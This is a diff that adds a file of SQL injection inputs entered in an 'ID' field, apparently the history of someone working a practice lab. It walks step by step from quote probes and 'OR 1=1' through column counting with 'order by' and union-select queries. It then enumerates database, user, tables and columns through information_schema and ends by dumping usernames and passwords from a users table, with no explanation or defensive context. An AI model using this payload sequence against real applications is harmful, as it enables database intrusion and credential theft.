@@ -1,0 +1,72 @@
+ID:1
+ID:1
+ID:2
+ID:1
+ID:2
+ID:999
+ID:2
+ID:3
+ID:1'
+ID:1'
+ID:3
+ID:1
+ID:1
+ID:1'
+ID:1"
+ID:1'
+ID:999
+ID:1'
+ID:1
+ID:1
+ID:1'
+ID:1'
+ID:1'
+ID:1'
+ID:1'
+ID:42880471-8524-4104-91c9-0d83b31ebf61
+ID:1
+ID:1'
+ID:1 OR 1=1--
+ID:1' OR '1'='1
+ID:42880471-8524-4104-91c9-0d83b31ebf61
+ID:42880471-8524-4104-91c9-0d83b31ebf61
+ID:42880471-8524-4104-91c9-0d83b31ebf61
+ID:42880471-8524-4104-91c9-0d83b31ebf61
+ID:42880471-8524-4104-91c9-0d83b31ebf61
+ID:1
+ID:1'
+ID:1'
+ID:1
+ID:1'
+ID:1
+ID:1'
+ID:1'
+ID:1'
+ID:1
+ID:1'
+ID:1'#
+ID:1' --#
+ID:1' -- 
+ID:1 order by 4 -- 
+ID:1' order by 4 -- 
+ID:1' order by 3 -- 
+ID:1' order by 4 -- 
+ID:1' unior select 1, 2, 4 -- 
+ID:1' unior select 1, 2, 3 -- 
+ID:1' unior select 1, 2, 3 -- 
+ID:1' union select 1, 2, 3 -- 
+ID:1' union select 1, 2, 4 -- 
+ID:1' union select 1, 2, 3 -- 
+ID:-1' union select 1, 2, 3 -- 
+ID:-1' union select 1, 2, database() -- 
+ID:-1' union select 1, user(), database() -- 
+ID:-1' union select user(), database(), @@datadir -- 
+ID:-1' union select user(), current_user, @@datadir -- 
+ID:-1' union select 1, 2, table_name from information_schema.tables where table_schema=database() -- 
+ID:-1' union select 1, 2, group_concate(table_name) from information_schema.tables where table_schema=database() -- 
+ID:-1' union select 1, 2, group_concat(table_name) from information_schema.tables where table_schema=database() -- 
+ID:-1' union select 1, 2, group_concat(column_name) from information_schema.columns where table_name='users' -- 
+ID:-1' union select 1, 2, group_concat(column_name) from information_schema.columns where table_name='urgents' -- 
+ID:-1' union select 1, 2, group_concat(column_name) from information_schema.columns where table_name='uagents' -- 
+ID:-1' union select 1, group_concat(username), group_concat(password) from users -- 
+ID:-1' union select 1, group_concat(username), group_concat(password) from users -- 
